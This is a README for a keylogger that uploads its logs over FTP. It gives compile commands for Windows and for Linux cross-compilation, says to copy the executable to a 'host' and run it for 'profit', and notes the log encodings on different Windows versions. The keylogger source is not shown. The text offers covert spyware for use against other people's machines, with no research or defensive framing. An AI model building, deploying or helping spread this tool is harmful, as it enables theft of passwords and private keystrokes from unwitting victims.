### About

A tiny keylogger with ftp upload.

Tested on Win XP, Win Vista, Win 7, Win 8.

### Usage
* copy `config.def.h` to `config.h` and edit
* compile

1. Windows (*with MinGW*):
```
gcc.exe keylogger.c -lwsock32 -o <name.exe> -s -Os
```

2. Linux (debian based):
```sh
sudo apt install gcc-mingw-w64-x86-64
x86_64-w64-mingw32-gcc keylogger.c -lwsock32 -o <name.exe> -s -Os
```

* copy <name.exe> to host
* run it and ... profit **:)**

### Note
* On **WinXP** log file has *CP1251* encoding
* On **Win7-Win8** log file has *UTF-16LE* encoding
